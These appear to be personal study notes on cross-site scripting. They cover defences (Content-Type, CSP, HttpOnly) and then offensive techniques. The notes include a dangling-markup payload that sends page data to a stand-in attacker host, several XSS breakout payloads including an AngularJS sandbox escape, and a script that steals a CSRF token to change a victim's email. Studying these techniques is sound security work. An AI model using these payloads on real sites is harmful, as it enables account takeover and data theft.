
XSS

To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use 
the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend.
Use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still can occur. 

Content-Type explaination: 
 XSS only applies to documents that are capable of running active script content in the first place.

A page with the MIME type application/json can't contain active content. To the browser it's just data. The situation would be similar with text/plain, 
text/javascript, image/jpeg, etc.

XSS would be possible with a MIME type of e.g. text/html, image/svg+xml, text/xml and many others. In some cases, vendor-related types such as 
application/x-shockwave-flash may have an XSS potential, too.

-----------------------CSP
CSP is a browser security mechanism that aims to mitigate XSS and some other attacks. It works by restricting the resources (such as scripts and images) that a 
page can load and restricting whether a page can be framed by other pages. 
To enable CSP, a response needs to include an HTTP response header called Content-Security-Policy with a value containing the policy. The policy itself consists 
of one or more directives, separated by semicolons. 

script-src 'self'

The CSP directive can specify a nonce (a random value) and the same value must be used in the tag that loads a script. If the values do not match, then the script 
will not execute. To be effective as a control, the nonce must be securely generated on each page load and not be guessable.

The CSP directive can specify a hash of the contents of the trusted script. If the hash of the actual script does not match the value specified in the directive, 
then the script will not execute. If the content of the script ever changes, then you will of course need to update the hash value that is specified in the directive.

-------HttpOnly
Set-Cookie: sessionid=QmFieWxvbiA1; HttpOnly

Many applications hide their cookies from JavaScript using the HttpOnly flag. 
HttpOnly is an additional flag included in a Set-Cookie HTTP response header. Using the HttpOnly flag when generating a cookie helps mitigate 
the risk of client side script accessing the protected cookie (if the browser supports it).
If the HttpOnly flag (optional) is included in the HTTP response header, the cookie cannot be accessed through client side script 
(if the browser supports this flag)

-----Dangling markup injection

Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible.

Suppose an application embeds attacker-controllable data into its responses in an unsafe way:
<input type="text" name="input" value="CONTROLLABLE DATA HERE">

In this situation, an attacker would naturally attempt to perform XSS. But suppose that a regular XSS attack is not possible, due to input filters, 
content security policy, or other obstacles. Here, it might still be possible to deliver a dangling markup injection attack using a payload like the following:
"><img src='//attacker-website.com?

This payload creates an img tag and defines the start of a src attribute containing a URL on the attacker's server. Note that the attacker's payload doesn't close
the src attribute, which is left "dangling". When a browser parses the response, it will look ahead until it encounters a single quotation mark to terminate the 
attribute. Everything up until that character will be treated as being part of the URL and will be sent to the attacker's server within the URL query string. 
Any non-alphanumeric characters, including newlines, will be URL-encoded.

The consequence of the attack is that the attacker can capture part of the application's response following the injection point, which might contain sensitive data. 
Depending on the application's functionality, this might include CSRF tokens, email messages, or financial data.

Any attribute that makes an external request can be used for dangling markup. 
It is also useful if some secret is saved in clear text in the HTML and you want to exfiltrate it from the client, or if you want to mislead some script execution.

------------------------------------DOM XSS, what is the DOM?

DOM is a programming interface for web documents. It represent the page as nodes and objects.
DOM can be manipulated with javascript, for example document.querySelectorAll('p') select all <p> att
in the document. The document object represent the document itself.
The DOM is built using multiple APIs that work together. The core DOM defines the entities describing any document and the objects within it.
For example, the HTML DOM API adds support for representing HTML documents to the core DOM, and the SVG API adds support for representing SVG documents. 
Implementations of the DOM can be built for any language.
When you create a script, whether inline in a <script> element or included in the web page, you can immediately begin using the API for the document or window
objects to manipulate the document itself

-----------------------------------XSS Payload

Remember that you can execute JS in Href att. with: javascript:alert(1) (jQuery)

Try to use - alert() - or + alert() + for strings OR tru to use ; alert() ; to inject xss on Javascript code

Ex:  <script>
            var searchTerms = 'dcsdc'; alert(1) ; var myvar = '1';
            document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
    </script>

    payload = dcsdc'; alert(1) ; var myvar = '1    (XSS Injected on JS)


AngularJS and regular js. Try to insert {{ 1 + 1 }}, if the input is evalueted and you receive 2 ther is a XSS vuln. ---> {{constructor.constructor('alert(1)')()}}

If you know that the user is gonna press a key you can use ?accesskey = x onclick = alert(1) (only chrome)


For brek out from JS string / JSON try  \'-alert(1)// (when < and " are blacklisted but not \) bc \ is used to escape special characters in JS

you can also try \';alert(1)//   the \ is for the escape of ' . Because sometimes ' = '\' so with \'  you got =  '\\';yourcode//'


--------------CSRF using XSS: 
<script>
var req = new XMLHttpRequest();//It depends on the api, you can try with fetch()
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; //take the users CSRF token
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com') //Append CSRF token and change email
};
</script>


